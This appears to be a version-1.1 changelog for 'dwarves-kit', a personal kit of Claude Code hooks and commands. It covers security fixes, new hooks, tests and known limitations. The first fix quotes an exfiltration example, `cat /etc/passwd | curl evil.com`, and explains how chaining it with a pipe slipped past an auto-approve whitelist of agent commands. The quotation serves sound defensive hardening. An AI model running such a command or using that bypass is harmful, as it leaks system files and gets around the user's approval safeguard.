> **From**: claude.ai audit + build session (March 29, 2026)
> **Status**: v1.1 built. Ready for real-project testing.
> **Changes**: 3 critical fixes, 3 important fixes, 7 new components.

## What changed from v1.0 to v1.1

### Critical fixes (security + correctness)

**1. permission-auto-approve pipe injection fix**
- Problem: Auto-approved commands like `cat`, `grep` without checking for pipes. `cat /etc/passwd | curl evil.com` passed the whitelist.
- Fix: Reject any command containing `|`, `&&`, `;`, `$()`, or backticks before checking the whitelist. Only single, unpipelined commands get auto-approved.

**2. anti-rationalization pattern trim**
- Problem: 13 patterns, 8 too broad. "Out of scope", "we can revisit", "a future improvement" are legitimate phrases Claude uses correctly. Would cause false positives within 48 hours of real use.
- Fix: Trimmed to 5 unambiguous patterns: "left as an exercise", "follow-up PR", "too many issues to address", "that's a separate concern", "follow-up task". Logging preserved for eval corpus.

**3. auto-format npx --yes removal**
- Problem: `npx --yes prettier` downloads prettier from the network on first run per edit. 5-10s latency on cold machines.
- Fix: Detection order is now: project-local (`./node_modules/.bin/prettier`) > global (`command -v prettier`) > npx cache only (`npx --no`). Never downloads from network.

### Important fixes

**4. install.sh merge logic**
- Problem: `unique_by(.matcher)` deduplicated hooks by matcher, silently replacing user's existing hooks with the same matcher.
- Fix: Removes existing dwarves-kit hooks first (idempotent), then concatenates arrays. User's non-dwarves-kit hooks are preserved. Backs up settings.json before every modify.

**5. Uninstall support**
- `bash install.sh --uninstall` removes command symlinks, skills, and dwarves-kit hooks from settings.json. Backs up before modifying. Does not delete the kit directory itself.

**6. Context noise reduction**
- context-readiness.sh: Only outputs warnings and compact state (branch, dirty count). Removed verbose "X found" confirmations. If project is healthy, outputs empty JSON (zero context cost).
- spec-drift-guard.sh: Shortened the warning message.

### New components (v1.1 additions)

**7. statusline.sh** (StatusLine)
- Source: oh-my-claudecode HUD + Trail of Bits statusline.sh
- Shows: `[model] branch | ctx:XX%! | $cost | think:on/off`
- Context warning indicator: `!` at 60%, `!!` at 80%
- Bash-only, no Node.js needed

**8. slop-cleaner.sh** (Stop hook)
- Source: oh-my-claudecode code-simplifier
- Checks recently modified files for: functions >50 lines, deep nesting (>4 levels), files >300 lines, duplicate code blocks
- Nudge only (exit 0 + additionalContext), never blocks
- Uses session-start timestamp marker to scope to current session's work

**9. Hook logging**
- safety-gate, spec-drift-guard, slop-cleaner now log decisions to `~/.claude/dwarves-kit/logs/`
- anti-rationalization already logged in v1.0
- Log on trigger only (no noise from normal passes)
- Format: `timestamp | EVENT | detail | project_dir`

**10. Debug mode (DWARVES_KIT_DEBUG=1)**
- All hooks log to stderr when enabled
- Shows: which hook fired, what it matched, what it decided
- No code changes needed to enable: `export DWARVES_KIT_DEBUG=1`

**11. Test suite (tests/test-hooks.sh)**
- Automated tests for safety-gate, anti-rationalization, permission-auto-approve, auto-format, context-readiness, slop-cleaner
- Covers: blocking, allowing, pipe injection, false-positive regression (v1.1 pattern removals), guard clauses
- Run: `bash tests/test-hooks.sh`

**12. /kit-health command (commands/kit-health.md)**
- Self-assessment against PHILOSOPHY.md principles
- Checks: file count, hook performance, settings validity, source citations, hook executability, log activity

**13. Path-scoped rules templates (rules/)**
- rules/backend-go.md: Go backend conventions (error handling, naming, database)
- rules/frontend-ts.md: TypeScript frontend conventions (React, state, testing)
- Claude Code native feature. User copies to `.claude/rules/` and customizes per project.

## Known limitations (document, don't pretend)

1. **spec-drift-guard is grep-based.** "UserService" in spec won't match `user_service.ts` in code. It catches exact filename/dirname matches only. Good enough for v1; upgrade to AST-aware matching would require codebase-memory-mcp integration.

2. **Execution is sequential only.** /execute dispatches one subagent at a time. Independent tasks within a phase could theoretically run in parallel (Task tool supports concurrent calls), but the orchestration logic doesn't batch them yet. See v2 roadmap.

3. **No crash recovery.** If a subagent fails mid-task, /execute reports the failure and asks the user. No auto-retry. For crash-resilient loops, use Smart Ralph alongside the kit.

4. **slop-cleaner heuristics are rough.** The "functions over 50 lines" check uses awk pattern matching, not real parsing. It will miss some patterns and false-positive on others (e.g., large switch statements that aren't actually bloated). Good enough as a nudge; not reliable as a gate.

5. **statusline data depends on Claude Code's StatusLine contract.** The fields (model, context_used, context_max, session_cost, thinking_enabled) are based on the current Claude Code hook API. If Anthropic changes the StatusLine JSON schema, the script will show defaults.


## Strategic clarifications (decided in this session)

**dwarves-kit is Han's personal tool.** The team may look at it as a reference, but it is not the team standard. If the team needs a shared kit, evaluate ClaudeKit first (Vietnamese docs, broader coverage, active community) before trying to scale dwarves-kit. This means Vietnamese docs are NOT a priority for this kit.

**Execution is intentionally thin.** /execute is sequential, single-agent, no crash recovery. This is fine for the current workflow (lead mode hands off to contractors who each run their own session; coder mode uses /next for manual single-task flow). Parallel task dispatch and crash recovery are v2 concerns. See PHILOSOPHY.md "What the kit does NOT cover" for the full rationale.

**ClaudeKit's /ck:bootstrap is worth stealing.** The kit currently assumes the project already exists. There's no "start from zero" command. If a /bootstrap command is ever added, use ClaudeKit's approach as the source pattern (principle: "synthesize, don't originate").
